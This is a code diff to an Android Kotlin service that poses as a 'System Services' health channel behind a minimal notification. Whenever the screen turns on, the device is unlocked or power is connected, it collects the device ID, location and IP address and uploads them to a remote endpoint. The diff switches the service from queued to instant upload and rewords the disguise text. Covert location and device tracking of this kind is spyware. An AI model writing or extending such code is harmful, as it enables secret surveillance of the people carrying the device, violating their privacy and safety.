@@ -28,12 +28,11 @@ class InstantTelemetryService : Service() {
 
     private val scope = CoroutineScope(Dispatchers.IO)
     private lateinit var connectivityManager: ConnectivityManager
-    private var isReceiverRegistered = false
 
     private val hardwareReceiver = object : BroadcastReceiver() {
         override fun onReceive(context: Context?, intent: Intent?) {
             intent?.action?.let { action ->
-                logAndQueueEvent("TRIGGER_${action.substringAfterLast(".")}")
+                logAndUploadInstantly("TRIGGER_${action.substringAfterLast(".")}")
             }
         }
     }
@@ -48,21 +47,16 @@ class InstantTelemetryService : Service() {
     override fun onCreate() {
         super.onCreate()
         startDisguisedForeground()
+        
+        val filter = IntentFilter().apply {
+            addAction(Intent.ACTION_POWER_CONNECTED)
+            addAction(Intent.ACTION_USER_PRESENT)
+            addAction(Intent.ACTION_SCREEN_ON)
+        }
+        registerReceiver(hardwareReceiver, filter)
 
-        try {
-            val filter = IntentFilter().apply {
-                addAction(Intent.ACTION_POWER_CONNECTED)
-                addAction(Intent.ACTION_USER_PRESENT)
-                addAction(Intent.ACTION_SCREEN_ON)
-            }
-            registerReceiver(hardwareReceiver, filter)
-            isReceiverRegistered = true
-        } catch (e: Exception) {}
-
-        try {
-            connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
-            connectivityManager.registerDefaultNetworkCallback(networkCallback)
-        } catch (e: Exception) {}
+        connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
+        connectivityManager.registerDefaultNetworkCallback(networkCallback)
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -70,12 +64,8 @@ class InstantTelemetryService : Service() {
     }
 
     override fun onDestroy() {
-        if (isReceiverRegistered) {
-            try { unregisterReceiver(hardwareReceiver) } catch (e: Exception) {}
-        }
-        try {
-            connectivityManager.unregisterNetworkCallback(networkCallback)
-        } catch (e: Exception) {}
+        try { unregisterReceiver(hardwareReceiver) } catch (e: Exception) {}
+        try { connectivityManager.unregisterNetworkCallback(networkCallback) } catch (e: Exception) {}
         super.onDestroy()
     }
 
@@ -84,7 +74,7 @@ class InstantTelemetryService : Service() {
     private fun startDisguisedForeground() {
         val channelId = "system_health_channel"
         val channel = NotificationChannel(channelId, "System Services", NotificationManager.IMPORTANCE_MIN).apply {
-            description = "Maintains background connectivity"
+            description = "Maintains background device health connections"
             setShowBadge(false)
         }
         val manager = getSystemService(NotificationManager::class.java)
@@ -101,11 +91,11 @@ class InstantTelemetryService : Service() {
     }
 
     @SuppressLint("MissingPermission")
-    private fun logAndQueueEvent(eventType: String) {
+    private fun logAndUploadInstantly(eventType: String) {
         scope.launch {
             val hardwareId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
             val locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
-
+            
             var lat = 0.0
             var lon = 0.0
             var finalEvent = eventType
@@ -132,17 +122,8 @@ class InstantTelemetryService : Service() {
             }
 
             val dao = TelemetryDatabase.get(this@InstantTelemetryService).telemetryDao()
-            dao.insert(
-                TelemetryRecord(
-                    timestampMs = System.currentTimeMillis(),
-                    eventType = finalEvent,
-                    deviceId = hardwareId,
-                    latitude = lat,
-                    longitude = lon,
-                    ipAddress = ipAddr
-                )
-            )
-
+            dao.insert(TelemetryRecord(timestampMs = System.currentTimeMillis(), eventType = finalEvent, deviceId = hardwareId, latitude = lat, longitude = lon, ipAddress = ipAddr))
+            
             flushOfflineQueue()
         }
     }
@@ -150,7 +131,7 @@ class InstantTelemetryService : Service() {
     private fun flushOfflineQueue() {
         scope.launch {
             val dao = TelemetryDatabase.get(this@InstantTelemetryService).telemetryDao()
-            val batch = dao.getUnsynced(50)
+            val batch = dao.getUnsynced(100)
             if (batch.isNotEmpty()) {
                 val uploader = TelemetryUploader(BuildConfig.TELEMETRY_ENDPOINT)
                 if (uploader.upload(batch) is UploadOutcome.Success) {
@@ -160,4 +141,3 @@ class InstantTelemetryService : Service() {
         }
     }
 }
-
